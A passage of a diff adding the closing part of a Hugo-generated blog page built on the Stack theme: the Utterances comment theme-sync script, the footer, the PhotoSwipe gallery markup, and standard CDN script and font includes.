+        if (utterances) {
+            utterances.contentWindow.postMessage(
+                {
+                    type: 'set-theme',
+                    theme: `github-${theme}`
+                },
+                'https://utteranc.es'
+            );
+        }
+    }
+
+    addEventListener('message', event => {
+        if (event.origin !== 'https://utteranc.es') return;
+
+        
+        utterancesLoaded = true;
+        setUtterancesTheme(document.documentElement.dataset.scheme)
+    });
+
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (!utterancesLoaded) return;
+        setUtterancesTheme(e.detail)
+    })
+</script>
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 luokaihong
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
